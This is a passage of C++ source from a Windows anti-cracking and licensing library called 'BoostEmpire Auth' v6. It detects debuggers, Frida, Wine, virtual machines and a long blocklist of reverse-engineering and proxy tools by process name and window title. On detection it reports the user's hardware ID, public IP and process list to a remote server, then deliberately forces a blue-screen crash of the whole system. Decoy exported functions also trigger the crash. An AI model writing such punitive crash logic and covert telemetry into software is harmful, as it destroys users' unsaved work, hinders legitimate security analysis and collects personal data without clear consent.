        sprintf_s(pipeBuf, "\\\\.\\pipe\\linjector-%d", port);
        HANDLE h = CreateFileA(pipeBuf, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return true; }
    }

    // 2. Frida DLLs loaded into OUR process (gadget / direct inject)
    static const char* fridaMods[] = {
        "frida-agent-32.dll","frida-agent-64.dll","frida-gadget.dll",
        "frida-gadget-32.dll","frida-gadget-64.dll","frida_agent.dll",nullptr
    };
    for (int i = 0; fridaMods[i]; i++)
        if (GetModuleHandleA(fridaMods[i])) return true;

    // 3. Scan loaded module list for frida-prefixed DLLs via snapshot
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32, GetCurrentProcessId());
    if (snap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me{}; me.dwSize = sizeof(me);
        if (Module32FirstW(snap, &me)) {
            do {
                std::wstring wn(me.szModule);
                std::string  n(wn.begin(), wn.end());
                std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                if (n.find("frida") != std::string::npos) { CloseHandle(snap); return true; }
            } while (Module32NextW(snap, &me));
        }
        CloseHandle(snap);
    }

    // 4. Check ntdll for frida_agent_main export (injected gadget registers it)
    HMODULE hNtdll = BeAPI::GetNtdll();
    if (hNtdll && GetProcAddress(hNtdll, "frida_agent_main")) return true;

    return false;
}

// ============================================================================
// v6 NEW: WINE / COMPATIBILITY LAYER DETECTION
// Catches Linux-based crackers running your binary under Wine to bypass
// Windows-specific protections (BSOD does nothing on Linux).
// ============================================================================
inline bool WinePresent() {
    // 1. Wine registry key (always set by Wine)
    HKEY hk{};
    wchar_t wineReg[] = {L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'W',L'i',L'n',L'e',0};
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wineReg, 0, KEY_READ, &hk) == ERROR_SUCCESS) { RegCloseKey(hk); return true; }
    if (RegOpenKeyExW(HKEY_CURRENT_USER,  wineReg, 0, KEY_READ, &hk) == ERROR_SUCCESS) { RegCloseKey(hk); return true; }

    // 2. Wine's ntdll exports its own version function
    HMODULE hNt = BeAPI::GetNtdll();
    if (hNt) {
        if (GetProcAddress(hNt, "wine_get_version"))      return true;
        if (GetProcAddress(hNt, "wine_get_host_version")) return true;
        if (GetProcAddress(hNt, "__wine_dbch___ntdll"))   return true;
    }

    // 3. SMBIOS/WMI manufacturer field contains "WINE" under Wine
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coInited = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;
    IWbemLocator* pL{}; IWbemServices* pS{};
    if (SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator, (LPVOID*)&pL))) {
        if (SUCCEEDED(pL->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),nullptr,nullptr,nullptr,0,nullptr,nullptr,&pS))) {
            IEnumWbemClassObject* pE{};
            if (SUCCEEDED(pS->ExecQuery(_bstr_t(L"WQL"),
                _bstr_t(L"SELECT Manufacturer,Model FROM Win32_ComputerSystem"),
                WBEM_FLAG_FORWARD_ONLY, nullptr, &pE))) {
                IWbemClassObject* pO{}; ULONG r{};
                if (pE->Next(WBEM_INFINITE, 1, &pO, &r) == S_OK) {
                    static const wchar_t* wmiFields[] = {L"Manufacturer", L"Model", nullptr};
                    for (int fi = 0; wmiFields[fi]; fi++) {
                        VARIANT v; VariantInit(&v);
                        if (SUCCEEDED(pO->Get(wmiFields[fi], 0, &v, nullptr, nullptr)) && v.bstrVal) {
                            std::wstring s(v.bstrVal);
                            std::transform(s.begin(), s.end(), s.begin(), ::tolower);
                            if (s.find(L"wine") != std::wstring::npos) {
                                VariantClear(&v); pO->Release(); pE->Release();
                                pS->Release(); pL->Release();
                                if (coInited) CoUninitialize();
                                return true;
                            }
                        }
                        VariantClear(&v);
                    }
                    pO->Release();
                }
                pE->Release();
            }
            pS->Release();
        }
        pL->Release();
    }
    if (coInited) CoUninitialize();
    return false;
}

// ============================================================================
// ANTI-VM  (unchanged from v5)
// ============================================================================
inline bool IsVirtualMachine() {
    int ci[4]{}; __cpuid(ci, 1);
    if (ci[2] & (1 << 31)) {
        __cpuid(ci, 0x40000000);
        char v[13]{}; memcpy(v,&ci[1],4); memcpy(v+4,&ci[2],4); memcpy(v+8,&ci[3],4);
        std::string vs(v,12);
        if (vs.find("VMware")!=std::string::npos||vs.find("KVMKVM")!=std::string::npos||
            vs.find("VBoxV") !=std::string::npos||vs.find("XenVMM")!=std::string::npos) return true;
    }
    static const wchar_t* vmKeys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SOFTWARE\\Parallels\\Parallels Tools",L"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        L"SYSTEM\\ControlSet001\\Services\\vmbus",L"HARDWARE\\ACPI\\DSDT\\VBOX__",nullptr
    };
    for (int i=0; vmKeys[i]; i++) {
        HKEY hk{}; if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,vmKeys[i],0,KEY_READ,&hk)==ERROR_SUCCESS){RegCloseKey(hk);return true;}
    }
    static const wchar_t* vmFiles[] = {
        L"C:\\windows\\system32\\drivers\\vmmouse.sys",L"C:\\windows\\system32\\drivers\\vmhgfs.sys",
        L"C:\\windows\\system32\\drivers\\VBoxMouse.sys",L"C:\\windows\\system32\\drivers\\VBoxGuest.sys",nullptr
    };
    for (int i=0; vmFiles[i]; i++)
        if(GetFileAttributesW(vmFiles[i])!=INVALID_FILE_ATTRIBUTES) return true;
    char brand[49]{}; for(int j=0;j<3;j++){__cpuid(ci,0x80000002+j);memcpy(brand+j*16,ci,16);}
    std::string bs(brand); std::transform(bs.begin(),bs.end(),bs.begin(),::tolower);
    if(bs.find("vmware")!=std::string::npos||bs.find("virtualbox")!=std::string::npos||bs.find("qemu")!=std::string::npos) return true;
    return false;
}

// ============================================================================
// v6 ENHANCED: HWID — now includes NIC MAC address (harder to clone)
// UUID + CPU ID + Volume serial + Primary NIC MAC → hashed together
// ============================================================================
inline std::string GenerateHWID() {
    // --- BIOS UUID via WMI ---
    std::wstring uuid = L"NONE";
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coInit = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;
    IWbemLocator* pL{}; IWbemServices* pS{};
    if (SUCCEEDED(CoCreateInstance(CLSID_WbemLocator,nullptr,CLSCTX_INPROC_SERVER,IID_IWbemLocator,(LPVOID*)&pL))) {
        if (SUCCEEDED(pL->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),nullptr,nullptr,nullptr,0,nullptr,nullptr,&pS))) {
            IEnumWbemClassObject* pE{};
            if (SUCCEEDED(pS->ExecQuery(_bstr_t(L"WQL"),_bstr_t(L"SELECT UUID FROM Win32_ComputerSystemProduct"),WBEM_FLAG_FORWARD_ONLY,nullptr,&pE))) {
                IWbemClassObject* pO{}; ULONG r{};
                if (pE->Next(WBEM_INFINITE,1,&pO,&r)==S_OK) {
                    VARIANT v; VariantInit(&v);
                    if (SUCCEEDED(pO->Get(L"UUID",0,&v,nullptr,nullptr)) && v.bstrVal) uuid=v.bstrVal;
                    VariantClear(&v); pO->Release();
                }
                pE->Release();
            }
            pS->Release();
        }
        pL->Release();
    }
    if (coInit) CoUninitialize();

    // --- CPU ID ---
    int cpu[4]{}; __cpuid(cpu, 1);
    char cpuBuf[32]; sprintf_s(cpuBuf, "%08X%08X", cpu[0], cpu[3]);

    // --- Volume serial ---
    DWORD volSerial{};
    GetVolumeInformationW(L"C:\\",nullptr,0,&volSerial,nullptr,nullptr,nullptr,0);
    char volBuf[16]; sprintf_s(volBuf, "%08X", volSerial);

    // --- v6: Primary NIC MAC address (first Ethernet adapter) ---
    char macStr[20] = "000000000000";
    {
        ULONG bufLen = sizeof(IP_ADAPTER_INFO) * 16;
        std::vector<BYTE> adBuf(bufLen);
        if (GetAdaptersInfo((PIP_ADAPTER_INFO)adBuf.data(), &bufLen) == ERROR_SUCCESS) {
            for (PIP_ADAPTER_INFO p = (PIP_ADAPTER_INFO)adBuf.data(); p; p = p->Next) {
                if (p->Type == MIB_IF_TYPE_ETHERNET && p->AddressLength == 6) {
                    sprintf_s(macStr, "%02X%02X%02X%02X%02X%02X",
                        p->Address[0],p->Address[1],p->Address[2],
                        p->Address[3],p->Address[4],p->Address[5]);
                    break;
                }
            }
        }
    }

    std::string uuidStr(uuid.begin(), uuid.end());
    std::string raw = uuidStr + "|" + cpuBuf + "|" + volBuf + "|" + macStr;

    DWORD h1=5381, h2=52711;
    for (char c : raw) {
        h1 = ((h1 << 5) + h1) ^ (DWORD)c;
        h2 = ((h2 << 5) + h2) ^ (DWORD)(c * 31337);
    }
    char hwid[48]; sprintf_s(hwid, "BE-HW-%08X%08X%08X", h1, h2, volSerial);
    return std::string(hwid);
}

// ============================================================================
// HTTP HELPERS
// ============================================================================
inline std::string GetRealPublicIP() {
    HINTERNET hSes = WinHttpOpen(L"BoostEmpire/2.0",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
    if (!hSes) return "";
    HINTERNET hCon = WinHttpConnect(hSes, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hCon) { WinHttpCloseHandle(hSes); return ""; }
    HINTERNET hReq = WinHttpOpenRequest(hCon,L"GET",L"/?format=text",nullptr,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return ""; }
    if (!WinHttpSendRequest(hReq,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0)||!WinHttpReceiveResponse(hReq,nullptr)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return "";
    }
    std::string ip; DWORD sz{},rd{};
    do { WinHttpQueryDataAvailable(hReq,&sz); if(!sz) break; std::string b(sz,'\0'); WinHttpReadData(hReq,&b[0],sz,&rd); ip+=b.substr(0,rd); } while(sz>0);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
    if (ip.empty()||ip.size()>45||ip.find('.')==std::string::npos) return "";
    return ip;
}

// ============================================================================
// v6 NEW: CERTIFICATE PINNING HELPER
// After receiving a response, validates the server cert SHA-256 fingerprint
// against BE_CERT_PIN. A Fiddler/Charles MITM will present a different cert
// and fail immediately — BSOD.
// ============================================================================
inline bool VerifyCertPin(HINTERNET hReq) {
    std::string pin = BE_CERT_PIN;
    std::transform(pin.begin(), pin.end(), pin.begin(), ::tolower);
    // Allow bypass in development (set BE_CERT_PIN to "bypass")
    if (pin == "bypass" || pin.find("replace") != std::string::npos) return true;

    PCCERT_CONTEXT pCert = nullptr;
    DWORD sz = sizeof(PCCERT_CONTEXT);
    if (!WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCert, &sz) || !pCert)
        return false; // can't get cert → fail

    // Hash the full DER-encoded certificate bytes with BCrypt SHA-256
    std::string digest = BeCrypto::Sha256(pCert->pbCertEncoded, pCert->cbCertEncoded);
    CertFreeCertificateContext(pCert);

    std::string hexActual = BeCrypto::ToHex(digest);
    // Strip colons from pin if user included them
    std::string pinClean;
    for (char c : pin) if (c != ':') pinClean += c;

    return hexActual == pinClean;
}

// ============================================================================
// v6 ENHANCED: HttpPost — now adds HMAC signature header + cert pinning
// The HMAC-SHA256 of the request body is sent as x-be-sig header.
// Server verifies it to reject forged or replayed requests.
// ============================================================================
inline std::string HttpPost(const std::string& body, const std::string& pubKey,
                             const char* path = "/api/auth") {
    HINTERNET hSes = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return "";
    HINTERNET hCon = WinHttpConnect(hSes, BE_HOST, BE_PORT, 0);
    std::wstring wpath(path, path + strlen(path));
    HINTERNET hReq = WinHttpOpenRequest(hCon, L"POST", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return ""; }

    // v6: Compute HMAC-SHA256 of body using BE_HMAC_SECRET
    std::string sig = BeCrypto::ToHex(BeCrypto::HmacSHA256(BE_HMAC_SECRET, body));

    std::string hdr = "Content-Type: application/json\r\n"
                      "x-public-key: " + pubKey + "\r\n"
                      "x-be-sig: " + sig;
    std::wstring wHdr(hdr.begin(), hdr.end());

    if (!WinHttpSendRequest(hReq, wHdr.c_str(), (DWORD)-1,
            (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return "";
    }
    if (!WinHttpReceiveResponse(hReq, nullptr)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return "";
    }

    // v6: Verify certificate pin BEFORE reading body
    if (!VerifyCertPin(hReq)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
        TriggerBSOD("TLS certificate pin mismatch — MITM detected");
        return "";
    }

    std::string resp; DWORD sz{},rd{};
    do { WinHttpQueryDataAvailable(hReq,&sz); if(!sz) break; std::string b(sz,'\0'); WinHttpReadData(hReq,&b[0],sz,&rd); resp+=b.substr(0,rd); } while(sz>0);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
    return resp;
}

// ============================================================================
// v6 NEW: CHALLENGE-RESPONSE
// Fetches a one-time nonce from /api/auth/challenge before the main auth call.
// The client signs (licenseKey + hwid + nonce) with HMAC-SHA256.
// Server verifies the signature before processing the key — prevents replay.
//
// SERVER REQUIREMENT: Add POST /api/auth/challenge to server.js:
//   app.post('/api/auth/challenge', (req,res) => {
//     const nonce = require('crypto').randomBytes(16).toString('hex');
//     res.json({ nonce });
//   });
// Then in your /api/auth handler, verify:
//   const expected = crypto.createHmac('sha256', process.env.BE_HMAC_SECRET)
//     .update(body.key + body.hwid + body.nonce).digest('hex');
//   if (expected !== body.challenge_sig) return res.json({success:false,code:'BAD_CHALLENGE'});
// ============================================================================
inline std::string FetchChallenge(const std::string& pubKey) {
    std::string body = "{\"pubkey\":\"" + pubKey + "\"}";
    std::string resp = HttpPost(body, pubKey, "/api/auth/challenge");
    if (resp.empty()) return "";
    // Parse nonce from {"nonce":"..."}
    std::string needle = "\"nonce\":\"";
    auto p = resp.find(needle);
    if (p == std::string::npos) return "";
    p += needle.size();
    auto e = resp.find('"', p);
    return (e != std::string::npos) ? resp.substr(p, e - p) : "";
}

inline std::string JGet(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\":";
    auto p = json.find(needle);
    if (p == std::string::npos) return "";
    p += needle.size();
    while (p < json.size() && (json[p]==' '||json[p]=='\t')) p++;
    if (json[p] == '"') { auto e = json.find('"',p+1); return (e!=std::string::npos)?json.substr(p+1,e-p-1):""; }
    auto e = json.find_first_of(",}",p);
    return json.substr(p,e-p);
}

// ============================================================================
// PROCESS / WINDOW SCAN  (unchanged from v5 — full blacklist retained)
// ============================================================================
struct DetectedProc { DWORD pid; std::string name; };

inline std::vector<DetectedProc> ScanIDAProcesses() {
    static const char* bl[] = {
        "ida","ida64","idaq","idaq64","idag","idaw","idat","idat64","ida_export","ida_server",
        "win32_remote","win64_remote","ghidra","analyzeheadless","x64dbg","x32dbg","x96dbg",
        "ollydbg","odbgscript","windbg","windbg64","cheatengine","cheat engine","cheatengine-x86_64",
        "dnspy","de4dot","ilspy","dotpeek","justdecompile","processhacker","procmon","procmon64",
        "procexp","procexp64","pestudio","pe-sieve","pe-bear","cffexplorer","exeinfope","peid",
        "lordpe","reshacker","hiew","hxd","010editor","winhex","hexworkshop","wireshark","fiddler",
        "charlesproxy","mitmproxy","scylla","scylla_x64","scylla_x86","importrec","binaryninja",
        "radare2","cutter","apimonitor","frida","frida-server","snowman","retdec","immunity debugger",
        "httpdebugger","httptoolkit","burpsuite","burp suite","x64netdumper","reclass","reclass64",
        "wemod","artmoney","squalr","sandboxie","sandboxie-plus","pe-bear","detect-it-easy","diec",
        "objection","r2frida","dynamorio","pintools","mitmproxy","reqable","apidog",
        nullptr
    };
    std::vector<DetectedProc> found;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return found;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring wn(pe.szExeFile);
            std::string  n(wn.begin(), wn.end());
            std::transform(n.begin(), n.end(), n.begin(), ::tolower);
            for (int i = 0; bl[i]; i++)
                if (n.find(bl[i]) != std::string::npos) { found.push_back({pe.th32ProcessID,n}); break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

inline bool CrackToolRunning() { return !ScanIDAProcesses().empty(); }

// ── IDA WINDOW TITLE SCAN ────────────────────────────────────────────────────
inline bool IDAWindowOpen() {
    static const wchar_t* titles[] = {
        L"IDA - ",L"IDA Pro",L"IDA View",L"Hex-Rays",L"IDA64",L"IDAPython",
        L"Ghidra:",L"Ghidra ",L"CodeBrowser",
        L"x64dbg",L"x32dbg",L"OllyDbg",L"WinDbg",L"Immunity Debugger",
        L"Cheat Engine",L"Binary Ninja",L"Cutter",L"Rizin",
        L"dnSpy",L"ILSpy",L"dotPeek",L"de4dot",L"Recaf",
        L"PE Studio",L"PE-bear",L"CFF Explorer",L"Detect It Easy",
        L"Wireshark",L"Fiddler",L"Charles",L"mitmproxy",L"Burp Suite",
        L"Process Hacker",L"HxD",L"010 Editor",L"WinHex",L"Frida",L"Objection",
        nullptr
    };
    for (int i = 0; titles[i]; i++)
        if (FindWindowW(nullptr,titles[i])||FindWindowExW(nullptr,nullptr,nullptr,titles[i])) return true;
    return false;
}

// ── REPORT DETECTION TO SERVER ───────────────────────────────────────────────
inline void ReportDetection(
    const std::string& licenseKey, const std::string& pubKey,
    const std::string& trigger,    const std::vector<DetectedProc>& procs,
    const std::string& status,     const std::string& hwid="", const std::string& realIP="")
{
    std::string procArr = "[";
    for (size_t i = 0; i < procs.size(); i++) {
        if (i) procArr += ",";
        std::string sn; for (char c : procs[i].name) { if(c=='"'||c=='\\') sn+='\\'; sn+=c; }
        procArr += "{\"pid\":" + std::to_string(procs[i].pid) + ",\"name\":\"" + sn + "\"}";
    }
    procArr += "]";
    std::string body = "{\"key\":\""+licenseKey+"\",\"trigger\":\""+trigger+"\",\"status\":\""+status+"\",\"hwid\":\""+hwid+"\",\"real_ip\":\""+realIP+"\",\"processes\":"+procArr+"}";
    std::thread([body, pubKey]() {
        __try {
            HINTERNET hSes = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
            if (!hSes) return;
            HINTERNET hCon = WinHttpConnect(hSes, BE_HOST, BE_PORT, 0);
            if (!hCon) { WinHttpCloseHandle(hSes); return; }
            HINTERNET hReq = WinHttpOpenRequest(hCon,L"POST",L"/api/detection",nullptr,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
            if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return; }
            std::string sig = BeCrypto::ToHex(BeCrypto::HmacSHA256(BE_HMAC_SECRET, body));
            std::string hdr = "Content-Type: application/json\r\nx-public-key: "+pubKey+"\r\nx-be-sig: "+sig;
            std::wstring wh(hdr.begin(),hdr.end());
            WinHttpSendRequest(hReq,wh.c_str(),(DWORD)-1,(LPVOID)body.c_str(),(DWORD)body.size(),(DWORD)body.size(),0);
            WinHttpReceiveResponse(hReq,nullptr);
            WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
        } __except(EXCEPTION_EXECUTE_HANDLER) {}
    }).detach();
}

// ── WARN AND GRACE ───────────────────────────────────────────────────────────
inline bool WarnAndGraceIDA(
    const std::string& licenseKey, const std::string& pubKey,
    const std::string& trigger,    const std::vector<DetectedProc>& initialProcs,
    const std::string& hwid="",    const std::string& realIP="", int GRACE_SECONDS=30)
{
    ReportDetection(licenseKey, pubKey, trigger, initialProcs, "WARNED", hwid, realIP);
    std::string plist;
    for (auto& p : initialProcs) plist += "  \x95 " + p.name + "  (PID " + std::to_string(p.pid) + ")\r\n";
    std::string msg =
        "BoostEmpire has detected a reverse-engineering tool running on your machine.\r\n\r\n"
        "Detected processes:\r\n" + plist +
        "\r\nClose the tool(s) above and click OK to continue.\r\n"
        "You have " + std::to_string(GRACE_SECONDS) + " seconds before protection activates.\r\n\r\n"
        "WARNING: Ignoring this warning will trigger system protection.";
    std::wstring wm(msg.begin(),msg.end());
    std::atomic<bool> ok{false};
    std::thread([wm,&ok]() {
        MessageBoxW(nullptr,wm.c_str(),L"BoostEmpire \x2014 Security Warning",MB_ICONWARNING|MB_OK|MB_TOPMOST|MB_SETFOREGROUND);
        ok=true;
    }).detach();
    for (int elapsed=0; elapsed<GRACE_SECONDS; elapsed+=2) {
        Sleep(2000);
        auto cur = ScanIDAProcesses();
        if (cur.empty()) {
            ReportDetection(licenseKey,pubKey,trigger,initialProcs,"CLOSED_BY_USER",hwid,realIP);
            EnumWindows([](HWND hw,LPARAM)->BOOL{ wchar_t c[64]{}; GetClassNameW(hw,c,63); if(std::wstring(c)==L"#32770") PostMessageW(hw,WM_CLOSE,0,0); return TRUE; },0);
            return true;
        }
    }
    auto fp = ScanIDAProcesses();
    ReportDetection(licenseKey,pubKey,trigger,fp,"BSOD_TRIGGERED",hwid,realIP);
    Sleep(800);
    TriggerBSOD((trigger+": tool still open after warning").c_str());
    return false;
}

} // namespace Internal


// ============================================================================
// CODE INTEGRITY + IN-MEMORY PATCH DETECTION THREAD  (enhanced in v6)
// Now also calls BeHollowGuard::IsHollowed() on every tick.
// ============================================================================
namespace CodeIntegrity {
    static std::vector<uint8_t> g_baseline;
    static std::atomic<bool>    g_running{false};

    inline std::vector<uint8_t> HashExe() {
        wchar_t path[MAX_PATH]{}; GetModuleFileNameW(nullptr, path, MAX_PATH);
        HANDLE hf = CreateFileW(path,GENERIC_READ,FILE_SHARE_READ,nullptr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,nullptr);
        if (hf==INVALID_HANDLE_VALUE) return {};
        uint64_t h = 0xCBF29CE484222325ULL;
        uint8_t buf[4096]; DWORD rd{};
        while (ReadFile(hf,buf,sizeof(buf),&rd,nullptr)&&rd>0)
            for (DWORD i=0;i<rd;i++){h^=buf[i];h*=0x100000001B3ULL;}
        CloseHandle(hf);
        std::vector<uint8_t> r(8);
        for (int i=0;i<8;i++) r[i]=(uint8_t)(h>>(i*8));
        return r;
    }

    inline void Start() {
        if (g_baseline.empty()) g_baseline = HashExe();
        g_running = true;
        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::seconds(30));
            while (g_running.load()) {
                // Check 1: disk file hash
                auto cur = HashExe();
                if (!cur.empty() && !g_baseline.empty() && cur != g_baseline)
                    Internal::TriggerBSOD("Binary integrity violation");

                // v6 Check 2: live .text section CRC + image base
                if (BeHollowGuard::IsHollowed())
                    Internal::TriggerBSOD("Process hollowing detected");

                std::this_thread::sleep_for(std::chrono::seconds(60));
            }
        }).detach();
    }
} // namespace CodeIntegrity


// ============================================================================
// TLS CALLBACK — fires BEFORE main() (enhanced in v6 with Frida + Wine checks)
// ============================================================================
namespace TLSGuard {
    inline void WINAPI Callback(PVOID /*hMod*/, DWORD reason, PVOID /*reserved*/) {
        if (reason == DLL_PROCESS_ATTACH) {
            BeState::Init();

            // Anti-debug check before ANY user code
            if (Internal::IsBeingDebugged())
                Internal::TriggerBSOD("TLS: Debugger at attach");

            // v6: Frida injected before we even started
            if (Internal::FridaPresent())
                Internal::TriggerBSOD("TLS: Frida detected at startup");

            // v6: Wine environment — BSOD does nothing, so exit instead
            if (Internal::WinePresent()) {
                MessageBoxA(nullptr,
                    "This application is not supported on compatibility layers.",
                    "BoostEmpire Auth — Unsupported Environment", MB_ICONERROR|MB_OK);
                ExitProcess(0xDEAD);
            }

            // v6: Record hollow guard baseline BEFORE nuking PE headers
            BeHollowGuard::Init();

            // Nuke PE header
            Internal::NukePEHeader();

            // Start integrity thread
            CodeIntegrity::Start();
        }
    }
} // namespace TLSGuard

#pragma comment(linker, "/include:__tls_used")
#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK _be_tls_cb = TLSGuard::Callback;
#pragma data_seg()


// ============================================================================
// FAKE EXPORT DECOYS  (unchanged from v5)
// ============================================================================
#ifdef __cplusplus
extern "C" {
#endif
__declspec(noinline) void __stdcall ValidateLicense() noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall CheckLicense()    noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall IsAuthenticated() noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall BypassAuth()      noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall GetLicenseKey()   noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall PatchAuth()       noexcept { Internal::TriggerBSOD("Fake export"); }
__declspec(noinline) void __stdcall RemoveCheck()     noexcept { Internal::TriggerBSOD("Fake export"); }
#ifdef __cplusplus
}
#endif


// ============================================================================
// PUBLIC API — Init()
// ============================================================================
inline AuthResult Init(const std::string& licenseKey,
                       const std::string& appName  = "MyApp",
                       bool allowVM    = false,
                       bool allowDebug = false) {
    AuthResult result{};
    BE_JUNK_1;

    std::string hwid   = Internal::GenerateHWID();
    std::string realIP = Internal::GetRealPublicIP();

    // ── PROCESS SCAN + GRACE DIALOG ──────────────────────────────────────────
    {
        auto procs = Internal::ScanIDAProcesses();
        if (!procs.empty()) {
            bool safe = Internal::WarnAndGraceIDA(licenseKey, BE_PUBLIC_KEY, "IDA_PROCESS", procs, hwid, realIP, 30);
            if (!safe) ExitProcess(0xDEAD);
            auto recheck = Internal::ScanIDAProcesses();
            if (!recheck.empty()) {
                Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "IDA_PROCESS", recheck, "BSOD_TRIGGERED", hwid, realIP);
                Sleep(600); Internal::TriggerBSOD("Crack tool still running after grace"); ExitProcess(0xDEAD);
            }
        }
    }

    // ── STATIC IDA ANALYSIS CHECKS ───────────────────────────────────────────
    if (Internal::IDADatabaseNearby()) {
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "IDA_DATABASE", {}, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("IDA database detected"); ExitProcess(0xDEAD);
    }
    if (Internal::IDAInstalled()) {
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "IDA_INSTALLED", {}, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("IDA Pro installation detected"); ExitProcess(0xDEAD);
    }
    if (Internal::IDAMutexPresent()) {
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "IDA_MUTEX", {}, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("IDA mutex/pipe detected"); ExitProcess(0xDEAD);
    }
    BE_JUNK_2;

    // ── ACTIVE DEBUGGER ───────────────────────────────────────────────────────
    if (!allowDebug && Internal::IsBeingDebugged()) {
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "DEBUGGER", {}, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("Debugger detected"); ExitProcess(0xDEAD);
    }

    // ── CRACK TOOL SECONDARY SCAN ─────────────────────────────────────────────
    if (Internal::CrackToolRunning()) {
        auto p2 = Internal::ScanIDAProcesses();
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "CRACK_TOOL", p2, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("Crack tool detected"); ExitProcess(0xDEAD);
    }

    // ── EMULATION ─────────────────────────────────────────────────────────────
    if (Internal::IsEmulated()) {
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "EMULATION", {}, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("Emulation detected"); ExitProcess(0xDEAD);
    }

    // ── v6: FRIDA INJECTION CHECK (runtime — may inject after startup) ────────
    if (Internal::FridaPresent()) {
        Internal::ReportDetection(licenseKey, BE_PUBLIC_KEY, "FRIDA_INJECT", {}, "BSOD_TRIGGERED", hwid, realIP);
        Sleep(600); Internal::TriggerBSOD("Frida injection detected"); ExitProcess(0xDEAD);
    }

    // ── VM CHECK ──────────────────────────────────────────────────────────────
    if (!allowVM && Internal::IsVirtualMachine()) {
        MessageBoxA(nullptr,
            "This application does not support virtual machines.\n"
            "Please run on a physical machine.",
            "BoostEmpire Auth — Unsupported Environment", MB_ICONERROR|MB_OK);
